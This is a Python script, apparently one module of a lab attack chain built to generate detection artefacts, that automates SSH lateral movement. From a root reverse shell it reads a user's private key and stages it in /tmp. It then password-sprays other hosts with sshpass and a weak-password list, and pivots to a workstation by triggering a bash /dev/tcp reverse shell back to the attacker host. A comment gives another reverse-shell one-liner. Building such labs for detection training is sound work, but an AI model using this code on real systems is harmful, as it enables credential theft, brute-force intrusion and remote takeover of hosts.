import base64
import re
import shlex
import socket
import threading
import time

# =============================================================================
# lateral_movement.py — Noisy Failed Attempts + Successful Lateral Movement
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files   (key discovery in john's home on apache)
#   T1110     – Brute Force            (failed attempts on hardened workstations)
#   T1110.001 – Password Guessing      (common-password spray on non-john hosts)
#   T1021.004 – Remote Services: SSH   (key-authenticated SSH to john's workstation)
#   T1078     – Valid Accounts         (reuse of john.stravidis identity)
# -----------------------------------------------------------------------------
# All phases execute FROM apache via the root reverse shell.
#
# Phase 1 — Credential discovery (deploy.log + private key on apache).
# Phase 2 — Noisy failed attempts against non-john internal hosts: john's
#            deploy key + a short password spray.  Every denied auth lands in
#            the remote sshd auth.log — the central T1110 detection beat.
# Phase 3 — Successful lateral to john's workstation with the deploy key.
# Phase 4 — Confirm identity, clean up staged key.
# =============================================================================

KALI_HOST        = "10.10.0.2"
WORKSTATION_IP   = "10.30.0.5"
WORKSTATION_USER = "john.stravidis"
WORKSTATION_PORT = 22
PORT_JOHN        = 6666

DEPLOY_LOG_PATH  = "/opt/waystar-connect/deploy.log"
REMOTE_KEY_PATH  = "/home/john.stravidis/.ssh/id_ed25519"
STAGED_KEY_PATH  = "/tmp/john_deploy_key"

# Passwords sprayed against non-john hosts — John's own credential first
# (simple reuse), then well-known weak passwords to model a real spray.
SPRAY_PASSWORDS = [
    "waystar2026!",
    "password",
    "admin",
    "123456",
    "changeme",
    "letmein",
]

# IPs that serve no user sshd worth spraying (router legs, db-internal).
_SKIP_SPRAY = {
    "10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4",
    "10.40.0.2", "10.10.0.2", "10.10.0.3",
}

# Known IPs of Luke's and Vinzenz's workstations — used when creds_scan
# isn't available (standalone / --only lateral mode).
_FALLBACK_SPRAY_TARGETS = ["10.30.0.7", "10.30.0.8"]


def send_command(shell, command):
    """Send a command through an active shell connection."""
    shell.sendall((command + "\n").encode())
    time.sleep(0.5)


_sentinel_seq = 0


def _drain(shell):
    """Discard stale bytes left in the socket buffer from a previous command."""
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=10):
    """
    Send cmd to shell, collect output, return it.

    Drains stale socket data first, then sends the command and a uniquely-
    numbered sentinel as two separate lines.  Bash echoes the sentinel line
    AFTER the command output, so buf[:sentinel_pos] captures the real output.
    """
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.5)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev_timeout = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev_timeout)

    # Everything before the sentinel echo is the real command output.
    if sentinel in buf:
        buf = buf[:buf.index(sentinel)]

    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    buf = buf.replace("\r", "")
    return buf.strip()


def _stage_key_on_apache(root_shell, key_text):
    """
    Write the private key to STAGED_KEY_PATH on apache via the root shell.
    Uses base64 encoding to avoid shell-quoting issues with PEM newlines.
    Returns True on success.
    """
    key_b64 = base64.b64encode(key_text.encode()).decode()
    stage_cmd = (
        f"printf '%s\\n' '{key_b64}' | base64 -d > {STAGED_KEY_PATH} "
        f"&& chmod 600 {STAGED_KEY_PATH} && echo KEY_OK"
    )
    result = _run_remote(root_shell, stage_cmd)
    return "KEY_OK" in result


def _read_id(shell, timeout=10):
    """Send 'id' and return the response string."""
    send_command(shell, "id")
    prev = shell.gettimeout()
    shell.settimeout(5)
    response = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = shell.recv(1024).decode(errors="replace")
            if chunk:
                response += chunk
                if "uid=" in response:
                    break
        except socket.timeout:
            break
    shell.settimeout(prev)
    return response


def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
                        workstation_port, kali_host, kali_port):
    """
    SSH from apache to workstation and trigger a reverse bash shell back to kali.
    Runs in a background thread — the connection stays open while the shell lives.
    """
    ssh_cmd = (
        f"ssh -f -n -i {STAGED_KEY_PATH} "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-p {workstation_port} "
        f"{workstation_user}@{workstation_ip} "
        f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
        f">/dev/null 2>&1 &"
    )
    send_command(root_shell, ssh_cmd)


def _denial_reason(out):
    """Classify an SSH auth failure output into a short human-readable reason."""
    if "Permission denied" in out or "publickey" in out:
        return "key not authorised"
    if "Connection refused" in out:
        return "connection refused"
    last_line = out.splitlines()[-1] if out else ""
    return last_line or "no response"


def _try_key(root_shell, ip, user, port):
    """Attempt SSH with john's staged key. Returns (success, output)."""
    cmd = (
        f"ssh -i {STAGED_KEY_PATH} "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o PasswordAuthentication=no "
        f"-o BatchMode=yes "
        f"-o ConnectTimeout=5 "
        f"-p {port} "
        f"{user}@{ip} id 2>&1"
    )
    out = _run_remote(root_shell, cmd, timeout=12)
    return ("uid=" in out and user in out), out


def _try_password(root_shell, ip, user, pwd, port):
    """Attempt SSH with a single password via sshpass. Returns (success, output)."""
    cmd = (
        f"sshpass -p {shlex.quote(pwd)} ssh "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o PasswordAuthentication=yes "
        f"-o PubkeyAuthentication=no "
        f"-o PreferredAuthentications=password "
        f"-o NumberOfPasswordPrompts=1 "
        f"-o ConnectTimeout=5 "
        f"-p {port} "
        f"{user}@{ip} id 2>&1"
    )
    out = _run_remote(root_shell, cmd, timeout=12)
    return ("uid=" in out and user in out), out


def _run_key_spray(root_shell, targets, user, port):
    """Try john's staged key against each target. Returns list of IPs that denied."""
    key_failures: list[str] = []
    print(f"\n[*] Key-based SSH attempts as {user} against {len(targets)} host(s)")
    for ip in targets:
        success, out = _try_key(root_shell, ip, user, port)
        if success:
            print(f"[!] {ip}  key auth succeeded (unexpected)")
        else:
            print(f"[-] {ip:<14}  key auth → {_denial_reason(out)}")
            key_failures.append(ip)
    return key_failures


def _run_password_spray(root_shell, targets, user, port):
    """Spray SPRAY_PASSWORDS against each target. Returns list of (ip, pwd) denied."""
    password_failures: list[tuple[str, str]] = []
    print(f"\n[*] Password spray: {len(SPRAY_PASSWORDS)} password(s) × {len(targets)} host(s)")
    for ip in targets:
        for pwd in SPRAY_PASSWORDS:
            success, _ = _try_password(root_shell, ip, user, pwd, port)
            if success:
                print(f"[!] {ip}  {user}:{pwd!r}  → AUTH OK (unexpected)")
            else:
                masked = pwd[:2] + "*" * (len(pwd) - 2) if len(pwd) > 4 else pwd
                print(f"[-] {ip:<14}  {user}:{masked:<14}  → denied")
                password_failures.append((ip, pwd))
            time.sleep(0.3)
    return password_failures


def _failed_attempts(root_shell, targets, user, ssh_port):
    """
    Run key spray then password spray against *targets*.
    All attempts are expected to fail — generates T1110 auth.log artefacts.
    Returns a summary dict.
    """
    key_failures    = _run_key_spray(root_shell, targets, user, ssh_port)
    password_failures = _run_password_spray(root_shell, targets, user, ssh_port)

    print(f"\n[*] Failed-attempt summary: {len(key_failures)} key failures, "
          f"{len(password_failures)} password failures — T1110 artefacts generated")
    return {
        "failed_lateral_targets": targets,
        "failed_lateral_key_failures": key_failures,
        "failed_lateral_password_failures": password_failures,
    }


def _discover_workstation(root_shell, workstation_ip, workstation_user):
    """
    Parse deploy.log on apache to find the workstation IP and user.
    Returns (ip, user) — falls back to the provided defaults on parse failure.
    """
    print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
    log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
    match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
    if match:
        user = match.group(1)
        ip   = match.group(2)
        print(f"[+] Found deploy identity: {user}@{ip}")
        return ip, user
    print(f"[!] Could not parse deploy.log; using defaults ({workstation_user}@{workstation_ip})")
    return workstation_ip, workstation_user


def _accept_john_shell(root_shell, workstation_user, workstation_ip,
                       workstation_port, kali_host):
    """
    Set up a listener, trigger the reverse shell via SSH, and return the
    accepted socket.  Cleans up the staged key on any failure path.
    Returns the john_shell socket, or None on timeout.
    """
    john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    john_server.bind(("0.0.0.0", PORT_JOHN))
    john_server.listen(1)
    print(f"[*] Waiting for john.stravidis shell on port {PORT_JOHN}...")

    t = threading.Thread(
        target=_fire_reverse_shell,
        args=(root_shell, workstation_user, workstation_ip,
              workstation_port, kali_host, PORT_JOHN),
        daemon=True,
    )
    t.start()

    john_server.settimeout(20)
    try:
        john_shell, addr = john_server.accept()
        print(f"[+] Shell received from {addr[0]}")
        return john_shell
    except socket.timeout:
        print("[-] Timeout — no shell received from workstation")
        print("    → check workstation can reach kali: route -n")
        print(f"    → check ssh works manually: ssh -i {STAGED_KEY_PATH} "
              f"{workstation_user}@{workstation_ip}")
        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
        print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
        return None
    finally:
        john_server.close()


_EMPTY_FAILED = {
    "failed_lateral_targets": [],
    "failed_lateral_key_failures": [],
    "failed_lateral_password_failures": [],
}


def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT,
        other_targets=None, john_ip=None):
    """
    Execute the full lateral-movement step: noisy failed attempts first, then
    the successful pivot to john's workstation.

    Args:
        root_shell (socket):    root shell on apache (from privesc step).
        kali_host (str):        kali IP for reverse-shell callback.
        workstation_ip (str):   john's workstation IP, or None to discover
                                via deploy.log (standalone / fallback mode).
        workstation_user (str): SSH username on john's workstation.
        workstation_port (int): SSH port on all targets.
        other_targets (list):   IPs to attack (and fail) before pivoting to john.
                                Comes from ctx.state["creds_scan"] minus john_ip.
                                Falls back to _FALLBACK_SPRAY_TARGETS if empty.
        john_ip (str):          john's workstation IP, excluded from failed targets.

    Returns:
        dict with:
            john_shell               — socket (or None on failure)
            failed_lateral_targets   — IPs where all attempts were denied
            failed_lateral_key_failures     — IPs where key auth was denied
            failed_lateral_password_failures — (ip, pwd) pairs that were denied
    """
    print("\n[*] Starting lateral movement phase...")

    # ------------------------------------------------------------------
    # Phase 1 — Credential discovery: deploy.log + private key on apache
    # ------------------------------------------------------------------
    if workstation_ip is not None:
        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
    else:
        workstation_ip = WORKSTATION_IP
        workstation_ip, workstation_user = _discover_workstation(
            root_shell, workstation_ip, workstation_user
        )

    print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
    raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)

    key_start = raw_key.find("-----BEGIN OPENSSH PRIVATE KEY-----")
    key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
    if key_start < 0 or key_end < 0:
        print(f"[-] Private key not found at {REMOTE_KEY_PATH}")
        return {"john_shell": None, **_EMPTY_FAILED}
    key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
    print("[+] Deploy key retrieved")

    print(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
    if not _stage_key_on_apache(root_shell, key_text):
        print("[-] Failed to stage deploy key on apache")
        return {"john_shell": None, **_EMPTY_FAILED}
    print("[+] Key staged successfully")

    # ------------------------------------------------------------------
    # Phase 2 — Noisy failed attempts against non-john internal hosts
    # ------------------------------------------------------------------
    effective_john_ip = john_ip or workstation_ip
    if other_targets:
        spray_targets = [
            ip for ip in other_targets
            if ip != effective_john_ip and ip not in _SKIP_SPRAY
        ]
    else:
        spray_targets = list(_FALLBACK_SPRAY_TARGETS)

    if spray_targets:
        print(f"\n[*] Phase 2 — failed lateral attempts on {len(spray_targets)} "
              f"non-john host(s): {', '.join(spray_targets)}")
        failed_result = _failed_attempts(root_shell, spray_targets,
                                         workstation_user, workstation_port)
    else:
        print("[*] Phase 2 — no non-john targets discovered, skipping failed attempts")
        failed_result = dict(_EMPTY_FAILED)

    # ------------------------------------------------------------------
    # Phase 3 — Verify SSH connectivity to john's workstation
    # ------------------------------------------------------------------
    print(f"\n[*] Phase 3 — pivoting to {workstation_user}@{workstation_ip}...")
    verify_out = _run_remote(
        root_shell,
        f"ssh -i {STAGED_KEY_PATH} "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o ConnectTimeout=8 "
        f"-p {workstation_port} "
        f"{workstation_user}@{workstation_ip} id",
        timeout=15,
    )
    if "uid=" not in verify_out:
        print(f"[-] SSH pre-check failed. Output: {verify_out!r}")
        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
        return {"john_shell": None, **failed_result}
    print(f"[+] SSH pre-check passed: {verify_out.strip()}")

    john_shell = _accept_john_shell(
        root_shell, workstation_user, workstation_ip, workstation_port, kali_host
    )
    if john_shell is None:
        return {"john_shell": None, **failed_result}

    # ------------------------------------------------------------------
    # Phase 4 — Confirm identity + clean up staged key
    # ------------------------------------------------------------------
    time.sleep(1)
    response = _read_id(john_shell)

    if "john.stravidis" in response:
        print("[+] Lateral movement successful!")
        print(f"[+] {response.strip()}")
    else:
        print("[-] john.stravidis not confirmed in id output")
        print(f"[?] Response: {response!r}")

    send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
    print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")

    return {"john_shell": john_shell, **failed_result}


# Test mode — not executed when imported by main.py.
# Usage: docker compose exec kali python3 /Attack-chain/lateral_movement.py
# Then in another terminal:
#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
if __name__ == "__main__":
    print("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        print(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    shell_ok = result["john_shell"] is not None
    print(f"\n[*] Result: {'success — john.stravidis shell active' if shell_ok else 'failed'}")
    print(f"[*] Failed-lateral targets: {result['failed_lateral_targets']}")
